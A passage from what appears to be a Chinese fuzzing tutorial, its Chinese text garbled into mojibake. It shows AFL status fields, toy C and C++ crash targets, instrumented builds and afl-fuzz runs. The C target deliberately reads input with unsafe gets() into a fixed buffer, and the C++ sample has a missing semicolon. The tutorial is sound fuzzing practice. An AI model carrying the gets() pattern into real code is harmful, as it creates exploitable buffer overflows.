¸æ¯”å¯ç”¨çš„å°‘çº¢è‰²-åˆ™è¡¨ç¤ºæ‚¨çš„CPUå¯èƒ½å·²ç»è¶…é¢è®¢é˜…è¿è¡Œé¢å¤–çš„fuzzerså¯èƒ½ä¸ä¼šç»™ä½ å¸¦æ¥ä»»ä½•å¥½å¤„</code></pre><p>1</p><pre class="language-none"><code class="language-none"> 10) Addendum: status and plot filesFor unattended operation, some of the key status screen information can be alsofound in a machine-readable format in the fuzzer_stats file in the outputdirectory. This includes: - start_time     - unix time indicating the start time of afl-fuzz - last_update    - unix time corresponding to the last update of this file - fuzzer_pid     - PID of the fuzzer process - cycles_done    - queue cycles completed so far - execs_done     - number of execve() calls attempted - execs_per_sec  - current number of execs per second - paths_total    - total number of entries in the queue - paths_found    - number of entries discovered through local fuzzing - paths_imported - number of entries imported from other instances - max_depth      - number of levels in the generated data set - cur_path       - currently processed entry number - pending_favs   - number of favored entries still waiting to be fuzzed - pending_total  - number of all entries waiting to be fuzzed - stability      - percentage of bitmap bytes that behave consistently - variable_paths - number of test cases showing variable behavior - unique_crashes - number of unique crashes recorded - unique_hangs   - number of unique hangs encountered - command_line   - full command line used for the fuzzing session - slowest_exec_ms- real time of the slowest execution in ms - peak_rss_mb    - max rss usage reached during fuzzing in mb</code></pre></div><h2 id="c-ç¼–è¯‘æ’æ¡©æµ‹è¯•">c ç¼–è¯‘æ’æ¡©æµ‹è¯•</h2><div class="story post-story"><h3 id="ç¼–å†™alftestcä»£ç ">ç¼–å†™alftestcä»£ç </h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//afltestc.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token keyword">void</span> <span class="token function">test</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'s'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'z'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'i'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"awesome found sizaif !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">raise</span><span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sorry not\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>           <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">test</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="åˆ›å»ºconfigure-makefileç­‰æ–‡ä»¶">åˆ›å»ºconfigure makefileç­‰æ–‡ä»¶</h3><pre class="language-bash" data-language="bash"><code class="language-bash">root@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># ls</span>Makefile.am  aclocal.m4  autom4te.cache  compile   config.h.in  configure     depcomp     missingMakefile.in  afltestc.c  autoscan.log    config.h  config.log   configure.ac  install-sh  stamp-h1</code></pre><h3 id="ä½¿ç”¨afl-gcc-æ’æ¡©">ä½¿ç”¨<code>afl-gcc</code> æ’æ¡©</h3><h4 id="afl-gccæ’æ¡©">afl-gccæ’æ¡©</h4><pre class="language-shell" data-language="shell"><code class="language-shell">root@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># CC=afl-gcc ./configure</span>checking <span class="token keyword">for</span> a BSD-compatible install<span class="token punctuation">..</span>. /usr/bin/install -cchecking whether build environment is sane<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> a thread-safe <span class="token function">mkdir</span> -p<span class="token punctuation">..</span>. /usr/bin/mkdir -pchecking <span class="token keyword">for</span> gawk<span class="token punctuation">..</span>. nochecking <span class="token keyword">for</span> mawk<span class="token punctuation">..</span>. mawkchecking whether <span class="token function">make</span> sets <span class="token variable"><span class="token variable">$(</span>MAKE<span class="token variable">)</span></span><span class="token punctuation">..</span>. <span class="token function">yes</span>checking whether <span class="token function">make</span> supports nested variables<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> gcc<span class="token punctuation">..</span>. afl-gccchecking whether the C compiler works<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> C compiler default output <span class="token function">file</span> name<span class="token punctuation">..</span>. a.outchecking <span class="token keyword">for</span> suffix of executables<span class="token punctuation">..</span>.checking whether we are cross compiling<span class="token punctuation">..</span>. nochecking <span class="token keyword">for</span> suffix of object files<span class="token punctuation">..</span>. ochecking whether we are using the GNU C compiler<span class="token punctuation">..</span>. <span class="token function">yes</span>checking whether afl-gcc accepts -g<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> afl-gcc option to accept ISO C89<span class="token punctuation">..</span>. none neededchecking whether afl-gcc understands -c and -o together<span class="token punctuation">..</span>. <span class="token function">yes</span>checking whether <span class="token function">make</span> supports the include directive<span class="token punctuation">..</span>. <span class="token function">yes</span> <span class="token punctuation">(</span>GNU style<span class="token punctuation">)</span>checking dependency style of afl-gcc<span class="token punctuation">..</span>. gcc3checking that generated files are newer than configure<span class="token punctuation">..</span>. <span class="token keyword">done</span>configure: creating ./config.statusconfig.status: creating Makefileconfig.status: creating config.hconfig.status: executing depfiles commands</code></pre><h4 id="ç¼–è¯‘è¿è¡Œ">ç¼–è¯‘è¿è¡Œ</h4><pre class="language-shell" data-language="shell"><code class="language-shell">root@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># make afl_harden=1</span><span class="token function">make</span>  all-ammake<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Entering directory <span class="token string">'/home/workhome/afl-test/ins-c'</span>afl-gcc -DHAVE_CONFIG_H -I.     -g -O2 -MT afltestc.o -MD -MP -MF .deps/afltestc.Tpo -c -o afltestc.o afltestc.cafl-cc <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span>afltestc.c: In <span class="token keyword">function</span> <span class="token string">'main'</span><span class="token builtin class-name">:</span>afltestc.c:26:5: warning: implicit declaration of <span class="token keyword">function</span> <span class="token string">'gets'</span><span class="token punctuation">;</span> did you mean <span class="token string">'fgets'</span>? <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>   <span class="token number">26</span> <span class="token operator">|</span>     gets<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">|</span>     ^~~~      <span class="token operator">|</span>     fgetsafl-as <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Instrumented <span class="token number">11</span> locations <span class="token punctuation">(</span><span class="token number">64</span>-bit, non-hardened mode, ratio <span class="token number">100</span>%<span class="token punctuation">)</span>.<span class="token function">mv</span> -f .deps/afltestc.Tpo .deps/afltestc.Poafl-gcc  -g -O2   -o afltestc afltestc.oafl-cc <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span>/usr/bin/ld: afltestc.o: <span class="token keyword">in</span> <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>main':/home/workhome/afl-test/ins-c/afltestc.c:26: warning: the <span class="token variable">`</span></span>gets<span class="token string">' function is dangerous and should not be used.make[1]: Leaving directory '</span>/home/workhome/afl-test/ins-c'</code></pre><p><strong>åˆ›å»º <code>in</code>,<code>crash</code> æ–‡ä»¶å¤¹</strong></p><p><code>in</code> ä¸­åˆ›å»ºåˆå§‹seed ï¼š <code>hello.txt</code></p><pre class="language-none"><code class="language-none"># hello.txthello</code></pre><p><strong>afl-fuzz è¿è¡Œ</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">$ afl-fuzz -d -i <span class="token keyword">in</span> -o crash ./afltestc root@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># afl-fuzz -d -i in -o crash ./afltestc </span>afl-fuzz <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> You have <span class="token number">16</span> CPU cores and <span class="token number">3</span> runnable tasks <span class="token punctuation">(</span>utilization: <span class="token number">19</span>%<span class="token punctuation">)</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Try parallel <span class="token function">jobs</span> - see /usr/local/share/doc/afl/parallel_fuzzing.txt.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking CPU core loadout<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found a <span class="token function">free</span> CPU core, binding to <span class="token comment">#0.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking core_pattern<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up output directories<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanning <span class="token string">'in'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> No auto-generated dictionary tokens to reuse.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating hard links <span class="token keyword">for</span> all input files<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Validating target binary<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Attempting dry run with <span class="token string">'id:000000,orig:hello.txt'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Spinning up the fork server<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All right - fork server is up.    len <span class="token operator">=</span> <span class="token number">6</span>, map size <span class="token operator">=</span> <span class="token number">4</span>, <span class="token builtin class-name">exec</span> speed <span class="token operator">=</span> <span class="token number">164</span> us<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">test</span> cases processed.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Here are some useful stats:    Test <span class="token keyword">case</span> count <span class="token builtin class-name">:</span> <span class="token number">1</span> favored, <span class="token number">0</span> variable, <span class="token number">1</span> total       Bitmap range <span class="token builtin class-name">:</span> <span class="token number">4</span> to <span class="token number">4</span> bits <span class="token punctuation">(</span>average: <span class="token number">4.00</span> bits<span class="token punctuation">)</span>        Exec timing <span class="token builtin class-name">:</span> <span class="token number">164</span> to <span class="token number">164</span> us <span class="token punctuation">(</span>average: <span class="token number">164</span> us<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> No -t option specified, so I'll use <span class="token builtin class-name">exec</span> <span class="token function">timeout</span> of <span class="token number">20</span> ms.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">set</span> and ready to roll<span class="token operator">!</span></code></pre><p><img src="https://s2.loli.net/2022/04/09/5rqBUlQ6nkDWhdb.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/5rqBUlQ6nkDWhdb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409151131697"></p><p><img src="https://s2.loli.net/2022/04/09/WVeSbI89NMZFPTH.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/WVeSbI89NMZFPTH.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409152000552"></p><h4 id="crash">crash</h4><blockquote><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'s'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'z'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'i'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"awesome found sizaif !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">raise</span><span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sorry not\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å½“è¾“å…¥seed çªå˜ä¸ºsizaifï¼Œä¸”é•¿åº¦ä¸º6æ—¶ï¼Œcrash</p></blockquote><p><img src="https://s2.loli.net/2022/04/09/ZE27aljhT1tzOP9.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/ZE27aljhT1tzOP9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409152818414"></p><h4 id="plot">plot</h4><p><img src="https://s2.loli.net/2022/04/09/JAGgVauxpSNECt7.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/JAGgVauxpSNECt7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409155148688"></p><h3 id="ä½¿ç”¨afl-clang-fast-æ’æ¡©">ä½¿ç”¨<code>afl-clang-fast</code> æ’æ¡©:</h3><pre class="language-shell" data-language="shell"><code class="language-shell">root@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># CC=afl-clang-fast ./configure</span>checking <span class="token keyword">for</span> a BSD-compatible install<span class="token punctuation">..</span>. /usr/bin/install -cchecking whether build environment is sane<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> a thread-safe <span class="token function">mkdir</span> -p<span class="token punctuation">..</span>. /usr/bin/mkdir -pchecking <span class="token keyword">for</span> gawk<span class="token punctuation">..</span>. nochecking <span class="token keyword">for</span> mawk<span class="token punctuation">..</span>. mawkchecking whether <span class="token function">make</span> sets <span class="token variable"><span class="token variable">$(</span>MAKE<span class="token variable">)</span></span><span class="token punctuation">..</span>. <span class="token function">yes</span>checking whether <span class="token function">make</span> supports nested variables<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> gcc<span class="token punctuation">..</span>. afl-clang-fastchecking whether the C compiler works<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> C compiler default output <span class="token function">file</span> name<span class="token punctuation">..</span>. a.outchecking <span class="token keyword">for</span> suffix of executables<span class="token punctuation">..</span>.checking whether we are cross compiling<span class="token punctuation">..</span>. nochecking <span class="token keyword">for</span> suffix of object files<span class="token punctuation">..</span>. ochecking whether we are using the GNU C compiler<span class="token punctuation">..</span>. <span class="token function">yes</span>checking whether afl-clang-fast accepts -g<span class="token punctuation">..</span>. <span class="token function">yes</span>checking <span class="token keyword">for</span> afl-clang-fast option to accept ISO C89<span class="token punctuation">..</span>. none neededchecking whether afl-clang-fast understands -c and -o together<span class="token punctuation">..</span>. <span class="token function">yes</span>checking whether <span class="token function">make</span> supports the include directive<span class="token punctuation">..</span>. <span class="token function">yes</span> <span class="token punctuation">(</span>GNU style<span class="token punctuation">)</span>checking dependency style of afl-clang-fast<span class="token punctuation">..</span>. gcc3checking that generated files are newer than configure<span class="token punctuation">..</span>. <span class="token keyword">done</span>configure: creating ./config.statusconfig.status: creating Makefileconfig.status: creating config.hconfig.status: executing depfiles commands</code></pre><h4 id="ç¼–è¯‘è¿è¡Œ-2">ç¼–è¯‘è¿è¡Œ</h4><pre class="language-shell" data-language="shell"><code class="language-shell">oot@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># make afl_harden=1</span><span class="token function">make</span>  all-ammake<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Entering directory <span class="token string">'/home/workhome/afl-test/ins-c'</span>afl-clang-fast -DHAVE_CONFIG_H -I.     -g -O2 -MT afltestc.o -MD -MP -MF .deps/afltestc.Tpo -c -o afltestc.o afltestc.cafl-clang-fast <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lszekeres@google.com<span class="token operator">></span>afltestc.c:26:5: warning: implicit declaration of <span class="token keyword">function</span> <span class="token string">'gets'</span> is invalid <span class="token keyword">in</span> C99 <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>    gets<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    ^afl-llvm-pass <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lszekeres@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Instrumented <span class="token number">11</span> locations <span class="token punctuation">(</span>non-hardened mode, ratio <span class="token number">100</span>%<span class="token punctuation">)</span>.<span class="token number">1</span> warning generated.<span class="token function">mv</span> -f .deps/afltestc.Tpo .deps/afltestc.Poafl-clang-fast  -g -O2   -o afltestc afltestc.oafl-clang-fast <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lszekeres@google.com<span class="token operator">></span>/usr/bin/ld: afltestc.o: <span class="token keyword">in</span> <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>main':/home/workhome/afl-test/ins-c/afltestc.c:26: warning: the <span class="token variable">`</span></span>gets<span class="token string">' function is dangerous and should not be used.make[1]: Leaving directory '</span>/home/workhome/afl-test/ins-c'</code></pre><p><strong>åˆ›å»º <code>in</code>,<code>crash</code> æ–‡ä»¶å¤¹</strong></p><p><code>in</code> ä¸­åˆ›å»ºåˆå§‹seed ï¼š <code>hello.txt</code></p><pre class="language-none"><code class="language-none"># hello.txtabc</code></pre><p><strong>afl-fuzz è¿è¡Œ</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">$ afl-fuzz -d -i <span class="token keyword">in</span> -o crash2 ./afltestc root@0187031113b5:/home/workhome/afl-test/ins-c<span class="token comment"># afl-fuzz -d -i in -o crash2 ./afltestc</span>afl-fuzz <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> You have <span class="token number">16</span> CPU cores and <span class="token number">2</span> runnable tasks <span class="token punctuation">(</span>utilization: <span class="token number">12</span>%<span class="token punctuation">)</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Try parallel <span class="token function">jobs</span> - see /usr/local/share/doc/afl/parallel_fuzzing.txt.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking CPU core loadout<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found a <span class="token function">free</span> CPU core, binding to <span class="token comment">#0.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking core_pattern<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up output directories<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanning <span class="token string">'in'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> No auto-generated dictionary tokens to reuse.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating hard links <span class="token keyword">for</span> all input files<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Validating target binary<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Attempting dry run with <span class="token string">'id:000000,orig:hello.txt'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Spinning up the fork server<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All right - fork server is up.    len <span class="token operator">=</span> <span class="token number">4</span>, map size <span class="token operator">=</span> <span class="token number">3</span>, <span class="token builtin class-name">exec</span> speed <span class="token operator">=</span> <span class="token number">152</span> us<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">test</span> cases processed.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Here are some useful stats:    Test <span class="token keyword">case</span> count <span class="token builtin class-name">:</span> <span class="token number">1</span> favored, <span class="token number">0</span> variable, <span class="token number">1</span> total       Bitmap range <span class="token builtin class-name">:</span> <span class="token number">3</span> to <span class="token number">3</span> bits <span class="token punctuation">(</span>average: <span class="token number">3.00</span> bits<span class="token punctuation">)</span>        Exec timing <span class="token builtin class-name">:</span> <span class="token number">152</span> to <span class="token number">152</span> us <span class="token punctuation">(</span>average: <span class="token number">152</span> us<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> No -t option specified, so I'll use <span class="token builtin class-name">exec</span> <span class="token function">timeout</span> of <span class="token number">20</span> ms.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">set</span> and ready to roll<span class="token operator">!</span></code></pre><p><img src="https://s2.loli.net/2022/04/09/vqBMwJTgDVLjIKd.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/vqBMwJTgDVLjIKd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409160927874"></p><h4 id="crash-2">crash</h4><p><img src="https://s2.loli.net/2022/04/09/bRylPJwx65SAt1s.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/bRylPJwx65SAt1s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409174504054"></p><h4 id="plot-2">plot</h4><p><img src="https://s2.loli.net/2022/04/09/XsQVZDbJR3Ny8eI.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/XsQVZDbJR3Ny8eI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409161251733"></p></div><h2 id="c-ç¼–è¯‘æ’æ¡©æµ‹è¯•-2">c++ ç¼–è¯‘æ’æ¡©æµ‹è¯•</h2><div class="story post-story"><p>ç¼–å†™<code>afltestc++</code>ä»£ç </p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;signal.h&gt;using namespace std;void test (string buf) &#123;    int len &#x3D; buf.length();    if ( len &#x3D;&#x3D; 6  &amp;&amp; buf[0] &#x3D;&#x3D; &#39;s&#39; &amp;&amp; buf[1]&#x3D;&#x3D;&#39;i&#39; &amp;&amp; buf[2]&#x3D;&#x3D;&#39;z&#39;)&#123;        cout&lt;&lt;&quot;awesome found sizaif !&quot;&lt;&lt;endl;        raise(SIGSEGV);    &#125;    else&#123;        cout&lt;&lt;&quot;sorry not&quot;&lt;&lt;endl;    &#125;&#125;int main(int argc, char *argv[]) &#123;        string buf &#x3D; &quot;&quot;;    cin&gt;&gt;buf    test(buf);    return 0;&#125;</code></pre><h3 id="ä½¿ç”¨afl-g-æ’æ¡©">ä½¿ç”¨<code>afl-g++</code>æ’æ¡© :</h3><pre class="language-shell" data-language="shell"><code class="language-shell">root@0187031113b5:/home/workhome/afl-test/ins-c++<span class="token comment"># afl-g++ -g -o afltestc++ afltestc++.cpp</span>afl-cc <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span>afl-as <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Instrumented <span class="token number">41</span> locations <span class="token punctuation">(</span><span class="token number">64</span>-bit, non-hardened mode, ratio <span class="token number">100</span>%<span class="token punctuation">)</span>.</code></pre><p><strong>è¿è¡Œ</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">root@0187031113b5:/home/workhome/afl-test/ins-c++<span class="token comment"># afl-fuzz -b 6 -i in -o crashc++ ./afltestc++</span>afl-fuzz <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> You have <span class="token number">16</span> CPU cores and <span class="token number">2</span> runnable tasks <span class="token punctuation">(</span>utilization: <span class="token number">12</span>%<span class="token punctuation">)</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Try parallel <span class="token function">jobs</span> - see /usr/local/share/doc/afl/parallel_fuzzing.txt.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking CPU core loadout<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found a <span class="token function">free</span> CPU core, binding to <span class="token comment">#6.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking core_pattern<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up output directories<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanning <span class="token string">'in'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> No auto-generated dictionary tokens to reuse.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating hard links <span class="token keyword">for</span> all input files<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Validating target binary<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Attempting dry run with <span class="token string">'id:000000,orig:hello.txt'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Spinning up the fork server<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All right - fork server is up.    len <span class="token operator">=</span> <span class="token number">29</span>, map size <span class="token operator">=</span> <span class="token number">15</span>, <span class="token builtin class-name">exec</span> speed <span class="token 